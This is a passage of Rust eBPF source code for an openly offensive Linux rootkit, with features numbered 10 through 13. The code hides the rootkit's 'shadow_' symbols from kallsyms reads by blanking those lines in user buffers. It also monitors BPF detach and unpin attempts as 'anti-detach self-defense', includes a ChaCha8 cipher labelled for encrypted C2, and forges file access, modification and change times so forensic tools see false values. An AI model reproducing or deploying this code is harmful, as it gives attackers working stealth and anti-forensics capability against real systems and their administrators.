        return Ok(0);
    }

    let scan_len = if args.count > 4096 {
        4096usize
    } else {
        args.count as usize
    };

    let buf = unsafe {
        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
        &mut *ptr
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let pattern: [u8; 7] = *b"shadow_";
    let max_scan = scan_len.saturating_sub(7);

    let mut i = 0usize;
    let mut modified = false;

    while i < max_scan {
        if i >= 4089 {
            break;
        }

        if buf.data[i] == pattern[0]
            && buf.data[i + 1] == pattern[1]
            && buf.data[i + 2] == pattern[2]
            && buf.data[i + 3] == pattern[3]
            && buf.data[i + 4] == pattern[4]
            && buf.data[i + 5] == pattern[5]
            && buf.data[i + 6] == pattern[6]
        {
            let mut line_start = i;
            while line_start > 0 && buf.data[line_start - 1] != b'\n' {
                line_start -= 1;
                if line_start == 0 {
                    break;
                }
            }

            let mut line_end = i + 7;
            while line_end < scan_len && line_end < 4096 && buf.data[line_end] != b'\n' {
                line_end += 1;
            }

            let mut k = line_start;
            while k < line_end && k < 4096 {
                buf.data[k] = b' ';
                k += 1;
            }

            modified = true;
            i = line_end + 1;
        } else {
            i += 1;
        }
    }

    if modified {
        let write_len = if scan_len > 4096 {
            4096u32
        } else {
            scan_len as u32
        };
        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                args.buf_ptr as *mut core::ffi::c_void,
                buf.data.as_ptr() as *const core::ffi::c_void,
                write_len,
            );
        }

        let event = EventHeader {
            event_type: EVENT_KALLSYMS_HIDDEN,
            pid: (pid_tgid >> 32) as u32,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: args.inode,
        };
        EVENTS.output(_ctx, &event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 11: Anti-Detach Self-Defense
// ──────────────────────────────────────────────

const BPF_PROG_DETACH: u32 = 9;
const BPF_OBJ_UNPIN: u32 = 19;
const BPF_LINK_DETACH: u32 = 34;

#[aya_ebpf::macros::tracepoint]
pub fn shadow_anti_detach(ctx: aya_ebpf::programs::TracePointContext) -> u32 {
    try_anti_detach(&ctx).unwrap_or_default()
}

fn try_anti_detach(ctx: &aya_ebpf::programs::TracePointContext) -> Result<u32, i64> {
    let cmd: u32 = unsafe { ctx.read_at(16).map_err(|_| 1i64)? };

    if cmd != BPF_PROG_DETACH && cmd != BPF_OBJ_UNPIN && cmd != BPF_LINK_DETACH {
        return Ok(0);
    }

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    let event = EventHeader {
        event_type: EVENT_ANTI_DETACH,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: cmd as u64,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 12: Encrypted C2 (ChaCha20 stream cipher)
// ──────────────────────────────────────────────

#[inline(always)]
fn chacha_quarter_round(state: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(16);

    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(12);

    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(8);

    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(7);
}

#[inline(always)]
fn chacha8_block(key: &[u8; 32], nonce: &[u8; 12], counter: u32) -> [u8; 64] {
    let mut state: [u32; 16] = [
        0x61707865,
        0x3320646e,
        0x79622d32,
        0x6b206574,
        u32::from_le_bytes([key[0], key[1], key[2], key[3]]),
        u32::from_le_bytes([key[4], key[5], key[6], key[7]]),
        u32::from_le_bytes([key[8], key[9], key[10], key[11]]),
        u32::from_le_bytes([key[12], key[13], key[14], key[15]]),
        u32::from_le_bytes([key[16], key[17], key[18], key[19]]),
        u32::from_le_bytes([key[20], key[21], key[22], key[23]]),
        u32::from_le_bytes([key[24], key[25], key[26], key[27]]),
        u32::from_le_bytes([key[28], key[29], key[30], key[31]]),
        counter,
        u32::from_le_bytes([nonce[0], nonce[1], nonce[2], nonce[3]]),
        u32::from_le_bytes([nonce[4], nonce[5], nonce[6], nonce[7]]),
        u32::from_le_bytes([nonce[8], nonce[9], nonce[10], nonce[11]]),
    ];

    let initial_state = state;

    for _ in 0..4u32 {
        chacha_quarter_round(&mut state, 0, 4, 8, 12);
        chacha_quarter_round(&mut state, 1, 5, 9, 13);
        chacha_quarter_round(&mut state, 2, 6, 10, 14);
        chacha_quarter_round(&mut state, 3, 7, 11, 15);
        chacha_quarter_round(&mut state, 0, 5, 10, 15);
        chacha_quarter_round(&mut state, 1, 6, 11, 12);
        chacha_quarter_round(&mut state, 2, 7, 8, 13);
        chacha_quarter_round(&mut state, 3, 4, 9, 14);
    }

    let mut i = 0;
    while i < 16 {
        state[i] = state[i].wrapping_add(initial_state[i]);
        i += 1;
    }

    let mut output = [0u8; 64];
    let mut j = 0;
    while j < 16 {
        let bytes = state[j].to_le_bytes();
        output[j * 4] = bytes[0];
        output[j * 4 + 1] = bytes[1];
        output[j * 4 + 2] = bytes[2];
        output[j * 4 + 3] = bytes[3];
        j += 1;
    }
    output
}

// ──────────────────────────────────────────────
// FEATURE 13: Timestomping (vfs_statx / vfs_getattr)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
    let path_ptr: u64 = match ctx.arg(0) {
        Some(v) => v,
        None => return 0,
    };
    let kstat_ptr: u64 = match ctx.arg(1) {
        Some(v) => v,
        None => return 0,
    };

    if kstat_ptr == 0 || path_ptr == 0 {
        return 0;
    }

    let dentry_ptr: u64 =
        match unsafe { bpf_probe_read_kernel((path_ptr + PATH_DENTRY_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return 0,
        };

    if dentry_ptr == 0 {
        return 0;
    }

    let inode_ptr: u64 = match unsafe {
        bpf_probe_read_kernel((dentry_ptr + DENTRY_D_INODE_OFFSET) as *const u64)
    } {
        Ok(v) => v,
        Err(_) => return 0,
    };

    if inode_ptr == 0 {
        return 0;
    }

    let i_ino: u64 =
        match unsafe { bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return 0,
        };

    if unsafe { TIMESTOMP_INODES.get(&i_ino).is_none() } {
        return 0;
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let entry = GetattrCtx {
        kstat_ptr,
        inode: i_ino,
    };
    let _ = GETATTR_ARGS.insert(&pid_tgid, &entry, 0);
    0
}

#[kretprobe]
pub fn shadow_timestomp(ctx: RetProbeContext) -> u32 {
    try_timestomp(&ctx).unwrap_or_default()
}

fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { GETATTR_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    let _ = GETATTR_ARGS.remove(&pid_tgid);

    if args.kstat_ptr == 0 {
        return Ok(0);
    }

    let entry = match unsafe { TIMESTOMP_INODES.get(&args.inode) } {
        Some(e) => *e,
        None => return Ok(0),
    };

    let zero_nsec: i64 = 0;

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_ATIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_atime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_ATIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_MTIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_mtime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_MTIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_CTIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_ctime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            (args.kstat_ptr + KSTAT_CTIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    let event = EventHeader {
        event_type: EVENT_TIMESTOMPED,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: args.inode,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
